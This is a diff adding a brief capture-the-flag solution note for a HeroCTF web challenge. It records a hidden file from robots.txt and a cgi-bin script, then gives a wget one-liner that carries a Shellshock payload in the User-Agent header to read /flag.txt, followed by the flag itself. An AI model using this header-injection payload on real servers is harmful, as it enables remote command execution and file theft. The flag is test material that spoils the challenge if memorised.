@@ -1,0 +1,11 @@
+/robots.txt
+=> /th1s1ss3cr3t.txt
+
+Hi Worty, I've put a test file for cgi-bin : wazuuup, check it out!
+
+/cgi-bin/wazuuup -> prints time
+
+https://0x90r00t.com/2015/08/03/cybercamp-2015-web-13-write-up/
+wget -U '() { :; }; echo; /bin/cat /flag.txt' -qO- http://challs.heroctf.fr:3015/cgi-bin/wazuuup
+
+Hero{sh3llsh0ck_1s_c00l_!!}
